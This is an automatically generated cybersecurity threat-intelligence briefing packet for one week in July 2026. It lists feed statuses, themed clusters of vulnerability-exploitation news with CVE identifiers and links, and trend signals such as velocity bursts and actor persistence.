# PHANTOMSignal Briefing Packet

- Generated: 2026-07-24T04:20:39.290325+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 76
- Total items in window: 319
- Total clusters raw: 143
- Total clusters in packet: 63
- Dropped low score: 80
- Dropped overflow: 0

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 2
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 3
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 3
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 0
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 3
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 0
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 7
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 4
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 15
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 2
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 19
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 23
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 6
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 24
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 21
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 0

## Affinity groups (themes)

### WordPress active exploitation
- Anchor signal: WordPress
- Theme key: wordpress
- Cluster count: 4
- Article count: 17
- Cohesion: 0.247
- Shared strong signals: WordPress
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, data_breach, ransomware_extortion
  - affected_industries: government
  - affected_products: WordPress, OpenAI/ChatGPT
  - cve_ids: CVE-2026-60137, CVE-2026-63030
  - urgency_signals: preauth_unauth, actively_exploited, poc_available
- Cluster IDs: 56fb338f87, c4020d76d0, 3d70163861, 2bab6cab95
- Links:
  - https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/
  - https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-60137-cve-2026-63030/
  - https://www.rapid7.com/blog/post/etr-cve-2026-63030-wp2shell-a-critical-remote-code-execution-vulnerability-in-wordpress-core
  - https://isc.sans.edu/diary/rss/33168
  - https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend
  - https://www.reddit.com/r/netsec/comments/1v07npi/wp2shell_cve202663030_preauth_rce_chain_in/
  - https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html
  - https://www.darkreading.com/cyberattacks-data-breaches/wp2shell-millions-wordpress-sites-remote-takeover
  - https://www.infosecurity-magazine.com/news/researchers-wordpress-exploit/
  - https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html
  - https://www.infosecurity-magazine.com/news/cisa-urgent-patch-fortinet/
  - https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/

### CVE-2025-66376 exploitation (Palo Alto Networks)
- Anchor signal: CVE-2025-66376
- Theme key: cve-2025-66376
- Cluster count: 5
- Article count: 5
- Cohesion: 0.599
- Shared strong signals: CVE-2025-66376
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: apt_espionage, phishing_social_eng, zero_day, ransomware_extortion
  - affected_industries: government, financial_services, critical_infrastructure, education, manufacturing_industrial
  - affected_products: Palo Alto Networks
  - cve_ids: CVE-2025-66376
  - urgency_signals: zero_day, no_patch_yet
- Cluster IDs: 332f35118d, 1ff0bf04bf, 02b144b02f, 76e10c02ae, f6874b93eb
- Links:
  - https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
  - https://unit42.paloaltonetworks.com/russian-webmail-espionage/
  - https://cyberscoop.com/russian-laundry-bear-zimbra-exploit/
  - https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
  - https://www.bleepingcomputer.com/news/security/russian-hackers-exploit-zimbra-zero-click-flaw-for-email-theft/

### Microsoft SharePoint active exploitation
- Anchor signal: Microsoft SharePoint
- Theme key: microsoft-sharepoint
- Cluster count: 4
- Article count: 6
- Cohesion: 0.269
- Shared strong signals: Microsoft SharePoint
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, ransomware_extortion, data_breach, credential_theft, zero_day
  - affected_industries: financial_services, manufacturing_industrial
  - affected_products: Microsoft SharePoint, OpenAI/ChatGPT
  - urgency_signals: actively_exploited, preauth_unauth, zero_day
- Cluster IDs: 8c3fd723aa, 2bab6cab95, 9e44f5cce0, 57de1d00b3
- Links:
  - https://www.rapid7.com/blog/post/etr-cve-2026-58644-microsoft-sharepoint-server-unauthenticated-remote-code-execution-vulnerability-exploited-in-the-wild
  - https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html
  - https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/
  - https://www.securityweek.com/upbound-group-says-data-breach-led-to-13-million-in-fraudulent-contract-losses/
  - https://www.securityweek.com/suno-paidwork-data-breaches-affect-tens-of-millions-of-accounts/

### Microsoft Defender vulnerability activity
- Anchor signal: Microsoft Defender
- Theme key: microsoft-defender
- Cluster count: 3
- Article count: 6
- Cohesion: 0.244
- Shared strong signals: Microsoft Defender
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Microsoft Defender
- Cluster IDs: 8c3fd723aa, 01f2f6d1a1, afe64cb742
- Links:
  - https://www.rapid7.com/blog/post/etr-cve-2026-58644-microsoft-sharepoint-server-unauthenticated-remote-code-execution-vulnerability-exploited-in-the-wild
  - https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html
  - https://www.microsoft.com/en-us/security/blog/2026/07/17/microsoft-at-black-hat-usa-2026-defending-trust-in-the-age-of-ai-and-supply-chain-attacks/
  - https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/

### zero day targeting Palo Alto Networks
- Anchor signal: Palo Alto Networks
- Theme key: palo-alto-networks
- Cluster count: 4
- Article count: 4
- Cohesion: 0.358
- Shared strong signals: Palo Alto Networks
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, phishing_social_eng, apt_espionage
  - affected_industries: manufacturing_industrial, financial_services, government
  - affected_products: Palo Alto Networks
  - cve_ids: CVE-2025-66376
  - urgency_signals: zero_day
- Cluster IDs: d9c1f05e41, 17b63d385b, 1ff0bf04bf, 76e10c02ae
- Links:
  - https://unit42.paloaltonetworks.com/siemens-rox-ii-zero-day-vulnerabilities/
  - https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
  - https://unit42.paloaltonetworks.com/russian-webmail-espionage/
  - https://thehackernews.com/2026/07/russian-espionage-group-exploited.html

### ShinyHunters targeting Microsoft Entra
- Anchor signal: ShinyHunters
- Theme key: shinyhunters
- Cluster count: 7
- Article count: 4
- Cohesion: 0.387
- Shared strong signals: ShinyHunters
- Member CVEs: (none)
- Also targets: Microsoft 365, Salesforce
- Dominant features:
  - threat_categories: phishing_social_eng, zero_day, active_exploitation
  - actor_attribution: ShinyHunters
  - affected_products: Microsoft Entra, Salesforce, Microsoft 365
  - urgency_signals: zero_day, preauth_unauth, poc_available
- Cluster IDs: 14625d1950, 17b63d385b, 629e6024b5, b788e3a84d, c68e26f04e, 2de7ac9412, 86bb601c47
- Links:
  - https://cloud.google.com/blog/products/identity-security/find-and-fix-software-vulnerabilities-with-codemender/
  - https://thehackernews.com/2026/07/google-launches-gemini-35-flash-cyber.html
  - https://deepmind.google/blog/introducing-gemini-3-5-flash-cyber/
  - https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
  - https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
  - https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html
  - https://www.bleepingcomputer.com/news/security/australian-energy-provider-origin-says-data-breach-exposes-client-data/
  - https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html
  - https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365

### SonicWall active exploitation
- Anchor signal: SonicWall
- Theme key: sonicwall
- Cluster count: 3
- Article count: 6
- Cohesion: 0.229
- Shared strong signals: SonicWall
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, zero_day
  - affected_industries: government
  - affected_products: SonicWall
  - urgency_signals: actively_exploited, preauth_unauth, zero_day
- Cluster IDs: 48ddf62f59, 7db5fb6de1, b892e3088a
- Links:
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/
  - https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/
  - https://www.darkreading.com/vulnerabilities-threats/inc-ransomware-exploits-sonicwall-sma-zero-days
  - https://thehackernews.com/2026/07/sonicwall-sma-zero-days-exploited.html
  - https://www.bleepingcomputer.com/news/security/check-point-patches-smartconsole-zero-day-exploited-in-attacks/
  - https://www.bleepingcomputer.com/news/security/south-korea-discloses-data-breach-impacting-diplomats-worldwide/

### CVE-2024-24919 exploitation activity
- Anchor signal: CVE-2024-24919
- Theme key: cve-2024-24919
- Cluster count: 2
- Article count: 5
- Cohesion: 0.348
- Shared strong signals: CVE-2024-24919
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2024-24919, CVE-2026-16232, CVE-2026-50751
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: 049863205d, 7db5fb6de1
- Links:
  - https://www.rapid7.com/blog/post/etr-cve-2026-16232-critical-check-point-smartconsole-authentication-bypass-exploited-in-the-wild
  - https://www.securityweek.com/new-check-point-zero-day-vulnerability-exploited-in-the-wild/
  - https://thehackernews.com/2026/07/check-point-patches-exploited.html
  - https://www.helpnetsecurity.com/2026/07/23/check-point-vulnerability-cve-2026-16232/
  - https://www.bleepingcomputer.com/news/security/check-point-patches-smartconsole-zero-day-exploited-in-attacks/

### CVE-2026-50751 exploitation activity
- Anchor signal: CVE-2026-50751
- Theme key: cve-2026-50751
- Cluster count: 2
- Article count: 5
- Cohesion: 0.348
- Shared strong signals: CVE-2026-50751
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2024-24919, CVE-2026-16232, CVE-2026-50751
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: 049863205d, 7db5fb6de1
- Links:
  - https://www.rapid7.com/blog/post/etr-cve-2026-16232-critical-check-point-smartconsole-authentication-bypass-exploited-in-the-wild
  - https://www.securityweek.com/new-check-point-zero-day-vulnerability-exploited-in-the-wild/
  - https://thehackernews.com/2026/07/check-point-patches-exploited.html
  - https://www.helpnetsecurity.com/2026/07/23/check-point-vulnerability-cve-2026-16232/
  - https://www.bleepingcomputer.com/news/security/check-point-patches-smartconsole-zero-day-exploited-in-attacks/

### CVE-2026-16232 exploitation activity
- Anchor signal: CVE-2026-16232
- Theme key: cve-2026-16232
- Cluster count: 2
- Article count: 5
- Cohesion: 0.348
- Shared strong signals: CVE-2026-16232
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2024-24919, CVE-2026-16232, CVE-2026-50751
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: 049863205d, 7db5fb6de1
- Links:
  - https://www.rapid7.com/blog/post/etr-cve-2026-16232-critical-check-point-smartconsole-authentication-bypass-exploited-in-the-wild
  - https://www.securityweek.com/new-check-point-zero-day-vulnerability-exploited-in-the-wild/
  - https://thehackernews.com/2026/07/check-point-patches-exploited.html
  - https://www.helpnetsecurity.com/2026/07/23/check-point-vulnerability-cve-2026-16232/
  - https://www.bleepingcomputer.com/news/security/check-point-patches-smartconsole-zero-day-exploited-in-attacks/

### CVE-2026-15409 exploitation activity
- Anchor signal: CVE-2026-15409
- Theme key: cve-2026-15409
- Cluster count: 2
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: CVE-2026-15409
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - cve_ids: CVE-2026-15409
  - urgency_signals: preauth_unauth
- Cluster IDs: 48ddf62f59, 2bab6cab95
- Links:
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/
  - https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/
  - https://www.darkreading.com/vulnerabilities-threats/inc-ransomware-exploits-sonicwall-sma-zero-days
  - https://thehackernews.com/2026/07/sonicwall-sma-zero-days-exploited.html
  - https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/

### AWS vulnerability activity
- Anchor signal: AWS
- Theme key: aws
- Cluster count: 2
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: AWS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: AWS
- Cluster IDs: c4020d76d0, 8cd8d46bd5
- Links:
  - https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html
  - https://aws.amazon.com/blogs/security/do-more-with-aws-waf-labels-using-dynamic-label-interpolation/
  - https://thehackernews.com/2026/07/aws-kiro-flaw-let-poisoned-web-page.html

## Forward signals

### Novelty
- Novel cves: 0
- Novel actors: 0
- Novel products: 0

### Velocity bursts (4)
- **WordPress Core Pre-Auth RCE Chain Exploited in the Wild**
  - Cluster: 56fb338f87
  - Sources in window: 3
  - Window hours: 4.7
  - Cohort count: 6
- **OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure**
  - Cluster: 8cda373323
  - Sources in window: 3
  - Window hours: 3.9
  - Cohort count: 5
- **CVE-2026-15409 / CVE-2026-15410 | SonicWall SMA1000 Server-Side Request Forgery and Code Injection Vulnerabilities**
  - Cluster: 48ddf62f59
  - Sources in window: 3
  - Window hours: 2.2
  - Cohort count: 3
- **CVE-2026-16232: Critical Check Point SmartConsole Authentication Bypass Exploited in the Wild**
  - Cluster: 049863205d
  - Sources in window: 3
  - Window hours: 4.1
  - Cohort count: 2

### Leading edge (1)
- **OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure**
  - Cluster: 8cda373323
  - Lead hours: 30.4
  - First source: Risky Business News
  - Later Tier 1 source: Rapid7
  - Shared signals: Linux kernel, OpenAI/ChatGPT

### Convergence (15)
- Pair: CVE-2026-60137 + GitHub (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-60137 + Microsoft SharePoint (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-60137 + OpenAI/ChatGPT (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-60137 + SonicWall (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-60137 + WordPress (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-63030 + GitHub (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-63030 + Microsoft SharePoint (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-63030 + OpenAI/ChatGPT (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-63030 + SonicWall (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-63030 + WordPress (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-50522 + Microsoft Defender (cluster 8c3fd723aa, first observation: True)
- Pair: CVE-2026-50522 + Microsoft SharePoint (cluster 8c3fd723aa, first observation: True)
- Pair: CVE-2026-58644 + Microsoft Defender (cluster 8c3fd723aa, first observation: True)
- Pair: CVE-2026-58644 + Microsoft SharePoint (cluster 8c3fd723aa, first observation: True)
- Pair: CVE-2026-15409 + SonicWall (cluster 48ddf62f59, first observation: True)

### Drift (1)
- **ShinyHunters** (cluster 17b63d385b)
  - New industries: (none)
  - New products: Microsoft Entra, Palo Alto Networks
  - Prior top industries: education, financial_services, government
  - Prior top products: Anthropic/Claude, Salesforce, npm

### Persistence (8)
- actor_attribution: ShinyHunters (weeks observed: 8, cluster 17b63d385b)
- actor_attribution: Scattered Spider (weeks observed: 6, cluster a632c3dcbf)
- cve_ids: CVE-2026-25089 (weeks observed: 4, cluster 3d70163861)
- cve_ids: CVE-2026-0257 (weeks observed: 4, cluster 17b63d385b)
- cve_ids: CVE-2025-3248 (weeks observed: 4, cluster 916dc6a487)
- cve_ids: CVE-2026-50751 (weeks observed: 3, cluster 049863205d)
- cve_ids: CVE-2026-39808 (weeks observed: 3, cluster 3d70163861)
- cve_ids: CVE-2026-39987 (weeks observed: 3, cluster 9454090822)

### Tier inversion (0)

## Clusters

### Cluster 049863205d — score 71

- Title: CVE-2026-16232: Critical Check Point SmartConsole Authentication Bypass Exploited in the Wild
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-07-23T11:57:30+00:00
- Link: https://www.rapid7.com/blog/post/etr-cve-2026-16232-critical-check-point-smartconsole-authentication-bypass-exploited-in-the-wild
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: CVE-2026-16232

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- cve_ids: CVE-2024-24919, CVE-2026-16232, CVE-2026-50751, CVE-2026-62144, CVE-2026-62145
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- cve_ids: CVE-2026-16232, CVE-2026-62144, CVE-2026-62145, CVE-2026-50751, CVE-2024-24919
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
